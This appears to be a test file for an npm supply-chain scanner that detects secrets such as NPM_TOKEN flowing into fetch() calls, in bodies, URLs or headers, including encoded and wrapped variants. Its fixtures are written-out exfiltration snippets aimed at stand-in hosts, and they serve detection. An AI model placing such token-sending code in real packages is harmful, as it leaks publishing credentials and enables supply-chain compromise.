'use strict';

const { test } = require('node:test');
const assert = require('node:assert/strict');
const { astImports, loadParser } = require('../lib/ast-imports');
const { scanPackageDir } = require('../lib/scanner');
const { diffManifests } = require('../lib/diff');
const { selectBaseline } = require('../lib/comparison');
const { buildReview, renderMarkdown } = require('../lib/review');
const { renderSarif } = require('../lib/sarif');
const { mkTmpDir, writePackage, runCli } = require('./helpers');
const parser = loadParser();
const analyze = (code, file = 'index.js') => astImports(parser, code, file, 'script');
const flows = (code, file) => {
  const result = analyze(code, file);
  assert.equal(result.parsed, true);
  return result.credentialFlows.matches;
};
function fixture(code, version = '1') {
  return writePackage(mkTmpDir('credential-flows'), 'pkg', { name: 'pkg', version }, { 'index.js': code });
}
const source = 'const token = process.env.NPM_TOKEN;';
const beforeCode = `${source}\nfetch('https://example.test', {body:'ready'});`;
const afterCode = `${source}\nfetch('https://example.test', {body:token});`;

test('new unsupported sensitive paths and lost file analysis require review', () => {
  const before = scanPackageDir(fixture(afterCode), { deep: true });
  const after = scanPackageDir(fixture(`${source} fetch('https://example.test', {body:hash(token)});`), { deep: true });
  assert.equal(after.credentialFlows.matches.length, 0);
  assert.equal(after.credentialFlows.unresolved[0].reason, 'unmodeled-call');
  assert.equal(diffManifests(before, after).escalated, true);
  assert.equal(diffManifests(after, after).escalated, false);
  const unavailable = scanPackageDir(fixture(afterCode + " process.env.UNRELATED='x';"), { deep: true });
  assert.ok(diffManifests(before, unavailable).changes.some((c) => c.type === 'credential-flow-visibility-lost'));
  const { report } = buildReview(new Map([['pkg', [before]]]), new Map([['pkg', [after]]]));
  assert.match(renderMarkdown(report), /unresolved/);
  assert.equal(renderSarif(report).runs[0].results[0].properties.credentialFlows.unresolved.length, 1);
});

test('ordinary unknown fetch values do not become credential gaps', () => {
  assert.deepEqual(analyze("fetch(url, {body:JSON.stringify({status:'ok'})});").credentialFlows.unresolved, []);
  assert.deepEqual(analyze("const token=process.env.NPM_TOKEN; hash(token); fetch(url, {body:'ok'});").credentialFlows.unresolved, []);
});

test('models serialization, buffers, flat URLSearchParams, immutable objects and destructuring', () => {
  for (const body of ['JSON.stringify({token})', 'JSON.stringify({nested:{token}, items:[token]})',
    'Buffer.from(token)', "Buffer.from(token).toString('base64')", 'new URLSearchParams({token})']) {
    const result = analyze(`${source} fetch(url, {body:${body}});`).credentialFlows;
    assert.equal(result.matches.length, 1, body);
    assert.equal(result.unresolved.length, 0, body);
    assert.ok(result.matches[0].path.some((p) => p.kind === 'transform'));
  }
  assert.equal(flows(`${source} const data={token}; const copy=data; fetch(url, {body:JSON.stringify(copy)});`).length, 1);
  assert.equal(flows(`${source} const opts={body:token}; fetch(url, opts);`).length, 1);
  assert.equal(flows('const {NPM_TOKEN:token}=process.env; fetch(url,{body:token});').length, 1);
  assert.equal(flows(`${source} const data={token}; const {token:copy}=data; fetch(url,{body:copy});`).length, 1);
});

test('models reject overrides, mutation, escaping objects and custom serialization', () => {
  for (const code of [
    `${source} const JSON={stringify:x=>'safe'}; fetch(url,{body:JSON.stringify({token})});`,
    `${source} const j=JSON; j.stringify=x=>'safe'; fetch(url,{body:JSON.stringify({token})});`,
    `${source} change(JSON); fetch(url,{body:JSON.stringify({token})});`,
    `${source} globalThis.JSON.stringify=x=>'safe'; fetch(url,{body:JSON.stringify({token})});`,
    `${source} const holder={namespace:JSON}; change(holder); fetch(url,{body:JSON.stringify({token})});`,
    `${source} fetch(url,{body:JSON.stringify({token,toJSON(){return 'safe'}})});`,
    `${source} fetch(url,{body:JSON.stringify({token},()=> 'safe')});`,
    `${source} const data={token}; const other=data; other.token='safe'; fetch(url,{body:JSON.stringify(data)});`,
    `${source} const data={token}; mutate(data); fetch(url,{body:JSON.stringify(data)});`,
    `${source} const data={token}; globalThis.data=data; fetch(url,{body:JSON.stringify(data)});`,
    `${source} fetch(url,{body:new URLSearchParams({nested:{token}})});`,
    `${source} fetch(url,{body:{token}});`,
  ]) assert.equal(flows(code).length, 0, code);
  assert.ok(analyze('let token=process.env.NPM_TOKEN; fetch(url,{body:token});').credentialFlows.unresolved.length);
});

test('flow signature binds the request destination and method', () => {
  const a = scanPackageDir(fixture(`${source} fetch('https://service.test/api',{body:token});`), {deep:true});
  const b = scanPackageDir(fixture(`${source} fetch('https://service.test/collect',{body:token});`), {deep:true});
  assert.equal(diffManifests(a,b).escalated,true);
  assert.deepEqual(b.credentialFlows.matches[0].sink.destination,
    {status:'resolved',origin:'https://service.test',path:'/collect',method:'GET'});
  const c = scanPackageDir(fixture(`${source} fetch('https://service.test/api',{body:token,method:'POST'});`), {deep:true});
  assert.equal(diffManifests(a,c).escalated,true);
  assert.equal(flows(`${source} const unrelated='https://wrong.test'; fetch(url,{body:token});`)[0].sink.destination.status,'unresolved');
});

test('bounded local summaries trace return values and direct fetch wrappers at call sites', () => {
  for (const code of [
    `${source} function send(x){fetch('https://service.test',{body:x});} send(token);`,
    `${source} const send=(x)=>fetch('https://service.test',{body:x}); send(token);`,
    `${source} function identity(x){return x;} fetch(url,{body:identity(token)});`,
    `${source} function encode(x){return JSON.stringify({token:x});} fetch(url,{body:encode(token)});`,
    `${source} function send(x){fetch(url,{body:x});} function wrapper(x){send(x);} wrapper(token);`,
  ]) {
    const result=analyze(code).credentialFlows;
    assert.equal(result.matches.length,1,code);
    assert.ok(result.matches[0].path.some((p)=>p.kind==='parameter'),code);
  }
  const [flow]=flows(`${source} function send(url,x){fetch(url,{body:x});} send('https://service.test/path',token);`);
  assert.equal(flow.sink.destination.path,'/path');
  assert.equal(flows(`${source} function id(x){return 'safe';} fetch(url,{body:id(token)});`).length,0);
  assert.equal(flows(`${source} function id(x){return x;} function id(x){return 'safe';} fetch(url,{body:id(token)});`).length,0);
  assert.equal(flows(`${source} var id=x=>'safe'; function id(x){return x;} fetch(url,{body:id(token)});`).length,0);
});

test('unsupported wrappers report gaps, and recursive summaries stay bounded', () => {
  const code=`${source} function send(x){x='safe'; fetch(url,{body:x});} send(token);`;
  assert.equal(flows(code).length,0);
  assert.ok(analyze(code).credentialFlows.unresolved.some((g)=>g.reason==='unresolved-function'));
  const recursive=analyze(`${source} function id(x){return id(x);} fetch(url,{body:id(token)});`);
  assert.equal(recursive.parsed,true);
  assert.equal(recursive.credentialFlows.matches.length,0);
  assert.ok(recursive.credentialFlows.unresolved.length || recursive.credentialFlows.truncated);
});

test('traces immutable credential aliases to fetch with original source lines', () => {
  const [flow] = flows(`${source}\nconst copy = token;\nfetch(url, {body:copy});`);
  assert.equal(flow.source, 'NPM_TOKEN');
  assert.equal(flow.sink.argument, 'body');
  assert.deepEqual(flow.path.map((step) => [step.kind, step.line]),
    [['source', 1], ['binding', 2], ['binding', 3], ['sink', 3]]);
  assert.equal(flow.path[0].snippet, 'process.env.NPM_TOKEN');
});

test('traces URL, inline header values, concatenation, templates and typed wrappers', () => {
  assert.equal(flows("fetch('https://example.test/' + process.env.NPM_TOKEN);")[0].sink.argument, 'url');
  assert.equal(flows('fetch(url, {headers:{Authorization:`Bearer ${process.env.NPM_TOKEN}`}});')[0].sink.argument, 'headers.authorization');
  assert.equal(flows('const token: string = process.env.NPM_TOKEN!; fetch(url, {body:token as string});', 'index.ts').length, 1);
  assert.equal(flows("const env = process.env; const send = fetch; send(url, {body:env['NPM_TOKEN']});").length, 1);
});

test('co-occurrence, shadowing, mutable values and unknown transforms do not invent flows', () => {
  for (const code of [beforeCode,
    'function f(process) { fetch(url, {body:process.env.NPM_TOKEN}); }',
    `function f(fetch) { ${source} fetch(url, {body:token}); }`,
    'let token = process.env.NPM_TOKEN; fetch(url, {body:token});',
    `${source} fetch(url, {body:hash(token)});`,
    `${source} function f() { fetch(url, {body:token}); }`,
    `${source} const options = {body:token}; options.body = 'safe'; fetch(url, options);`,
    `${source} fetch(url, {body:token, body:'safe'});`,
    `${source} fetch(url, {body:token, ...other});`,
    `${source} fetch(url, {body:token, [other]:'safe'});`,
    "fetch(url, {body:process.env.NO_COLOR});",
    "const example = 'fetch(url, {body:process.env.NPM_TOKEN})';",
    '// fetch(url, {body:process.env.NPM_TOKEN});',
    `${source} token = 'safe'; fetch(url, {body:token});`,
  ]) assert.deepEqual(flows(code), [], code);
  assert.equal(analyze("process.env.NPM_TOKEN = 'safe'; fetch(url, {body:process.env.NPM_TOKEN});").credentialFlows.skippedReason, 'environment-mutation');
});

test('tracks local function bindings and ignores duplicate source appearances in one argument', () => {
  assert.equal(flows(`function f() { ${source} fetch(url, {body:token}); }`).length, 1);
  assert.equal(flows(`${source} fetch(url, {body:token + token});`).length, 1);
});

test('a new flow blocks even with the same capability categories, variables and endpoints', () => {
  const before = scanPackageDir(fixture(beforeCode), { deep: true });
  const after = scanPackageDir(fixture(afterCode, '2'), { deep: true });
  const diff = diffManifests(before, after);
  assert.deepEqual(diff.changes.map((c) => c.type), ['credential-flow-added']);
  assert.equal(diff.escalated, true);
  const { report } = buildReview(new Map([['pkg', [before]]]), new Map([['pkg', [after]]]));
  assert.equal(report.wouldFail, true);
  assert.equal(report.entries[0].credentialFlows.matches[0].file, 'index.js');
  assert.equal(report.entries[0].baselineEvidence[0].credentialFlows.matches.length, 0);
  assert.match(renderMarkdown(report), /NPM/);
  assert.match(renderMarkdown(report), /source: process/);
  assert.equal(renderSarif(report).runs[0].results[0].properties.credentialFlows.matches.length, 1);
  assert.equal(diffManifests(after, after).escalated, false);
});

test('flow comparison ignores formatting, keeps occurrences and distinguishes baseline candidates', () => {
  const before = scanPackageDir(fixture(afterCode), { deep: true });
  const formatted = scanPackageDir(fixture('\n\n' + afterCode.replaceAll('token', 'secret')), { deep: true });
  assert.equal(diffManifests(before, formatted).escalated, false);
  const twice = scanPackageDir(fixture(afterCode + "\nfetch('https://example.test', {body:token});"), { deep: true });
  assert.equal(diffManifests(before, twice).changes.filter((c) => c.type === 'credential-flow-added').length, 1);
  const absent = { ...before, credentialFlows: { ...before.credentialFlows, matches: [] } };
  assert.equal(selectBaseline([before, absent], formatted).kind, 'ambiguous');
  const legacy = { ...before }; delete legacy.credentialFlows;
  assert.equal(diffManifests(legacy, before).changes[0].type, 'credential-flow-unreviewed');
});

test('source snippets are escaped when rendered into Markdown', () => {
  const before = scanPackageDir(fixture(beforeCode), { deep: true });
  const after = scanPackageDir(fixture(`${source}\nfetch('<img src=x>', {body:token});`, '2'), { deep: true });
  const { report } = buildReview(new Map([['pkg', [before]]]), new Map([['pkg', [after]]]));
  assert.ok(!renderMarkdown(report).includes('<img'));
  assert.match(renderMarkdown(report), /&lt;img/);
});

test('flow limits remain bounded and prevent approval of a truncated scan', () => {
  const dir = fixture('fetch(url, {body:process.env.NPM_TOKEN});\n'.repeat(105));
  const manifest = scanPackageDir(dir, { deep: true });
  assert.equal(manifest.credentialFlows.matches.length, 100);
  assert.equal(manifest.credentialFlows.truncated, true);
  assert.equal(manifest.coverage.complete, false);
  assert.equal(diffManifests(manifest, manifest).escalated, true);
  assert.ok(manifest.capabilities.analysisIncomplete.reasons.includes('credential-flow-limit'));
});

test('CLI review and check surface a flow-only update and basic scanning stays optional', () => {
  const path = require('path');
  const root = mkTmpDir('flow-cli');
  const before = fixture(beforeCode), after = fixture(afterCode, '2');
  const old = path.join(root, 'old'), current = path.join(root, 'current'), baseline = path.join(root, 'lock.json');
  assert.equal(runCli(['scan', before, '--deep', '--out', path.join(old, 'pkg.json')]).status, 0);
  assert.equal(runCli(['baseline', old, '--out', baseline]).status, 0);
  assert.equal(runCli(['scan', after, '--deep', '--out', path.join(current, 'pkg.json')]).status, 0);
  assert.equal(runCli(['check', current, '--baseline', baseline]).status, 1);
  const review = runCli(['review', current, '--baseline', baseline, '--format', 'json']);
  assert.equal(review.status, 1);
  assert.equal(JSON.parse(review.stdout).entries[0].changes[0].type, 'credential-flow-added');
  assert.equal(scanPackageDir(after).credentialFlows, undefined);
});

test('package flow cap and unavailable-file diagnostics survive scan aggregation', () => {
  const dir = writePackage(mkTmpDir('flow-package-cap'), 'pkg', { name: 'pkg', version: '1' },
    Object.fromEntries(['a.js', 'b.js', 'c.js'].map((file) => [file,
      'fetch(url, {body:process.env.NPM_TOKEN});\n'.repeat(70)])));
  const result = scanPackageDir(dir, { deep: true });
  assert.equal(result.credentialFlows.matches.length, 200);
  assert.equal(result.credentialFlows.truncated, true);
  assert.equal(result.coverage.complete, false);
  const unavailable = scanPackageDir(fixture("process.env.NPM_TOKEN = 'safe'; fetch(url, {body:process.env.NPM_TOKEN});"), { deep: true });
  assert.equal(unavailable.credentialFlows.filesUnavailable, 1);
  assert.equal(unavailable.credentialFlows.errors[0].reason, 'environment-mutation');
  const malformed = scanPackageDir(fixture('const ='), { deep: true });
  assert.equal(malformed.credentialFlows.filesUnavailable, 1);
  assert.equal(malformed.coverage.complete, false);
});
